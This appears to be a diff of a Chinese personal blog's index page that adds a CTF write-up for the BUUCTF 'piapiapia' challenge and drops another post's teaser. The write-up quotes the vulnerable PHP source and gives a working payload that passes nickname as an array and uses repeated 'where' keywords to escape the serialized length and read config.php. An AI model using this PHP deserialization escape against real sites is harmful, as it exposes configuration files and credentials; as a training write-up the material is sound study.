@@ -163,6 +163,100 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/13/buuctf%20piapiapia/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/OIP.jpg">
+      <meta itemprop="name" content="晚安">
+      <meta itemprop="description" content="冲！">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小川同学的blogs">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/13/buuctf%20piapiapia/" class="post-title-link" itemprop="url">buuctf piapiapia</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-03-13 21:34:12 / 修改时间：23:34:10" itemprop="dateCreated datePublished" datetime="2021-03-13T21:34:12+08:00">2021-03-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/buuctf-web/" itemprop="url" rel="index"><span itemprop="name">buuctf web</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>1.源码泄露</p>
+<p>2.传入数组绕过长度限制</p>
+<p>3.php反序列化长度逃逸</p>
+<h2 id="关键源码"><a href="#关键源码" class="headerlink" title="关键源码"></a>关键源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* config.php */</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>即flag在config.php中。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* profile.php */</span></span><br><span class="line"><span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line"><span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br></pre></td></tr></table></figure>
+
+<p>构造<code>$profile[&#39;photo&#39;]=&#39;config.php&#39;</code>即可拿到flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* update.php */</span></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]; <span class="comment">//1234567890</span></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]; <span class="comment">//12345@qq.com</span></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];     <span class="comment">//nickname[] = &quot;&#125;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* class.php */</span></span><br><span class="line"><span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line"><span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br></pre></td></tr></table></figure>
+
+<p>我们看到在序列化之后修改了其中文本导致序列化对象增长</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line">		</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>我们看到传入了4个参数，并作了限制。</p>
+<p>所以我们的解题思路即为在nickname中传入数组绕过长度限制，构造一个恶意序列化数据。</p>
+<p>payload：</p>
+<blockquote>
+<p>post方式传参</p>
+<p>phone：12345678901</p>
+<p>email：<a href="mailto:&#49;&#50;&#x33;&#52;&#x35;&#x36;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#109;">&#49;&#50;&#x33;&#52;&#x35;&#x36;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#109;</a></p>
+<p>​        nickname[]=’wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere”};s:5:”photo”;s:10:”config.php”;}’</p>
+<p>photo：随便啥都行</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+    <div>
+      
+    </div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/11/buuctf%20ssrf%20me/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1154,90 +1248,6 @@ array(1) {
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAwp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/OIP.jpg">
-      <meta itemprop="name" content="晚安">
-      <meta itemprop="description" content="冲！">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小川同学的blogs">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/12/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAwp/" class="post-title-link" itemprop="url">攻防世界web进阶区简记</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-12-29 15:41:41" itemprop="dateCreated datePublished" datetime="2020-12-29T15:41:41+08:00">2020-12-29</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-03-10 22:33:46" itemprop="dateModified" datetime="2021-03-10T22:33:46+08:00">2021-03-10</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/" itemprop="url" rel="index"><span itemprop="name">攻防世界web</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>菜鸡做完题就需要记录以防下次忘记。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/12/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BAwp/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-    <div>
-      
-    </div>
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1309,7 +1319,7 @@ array(1) {
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-count">15</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
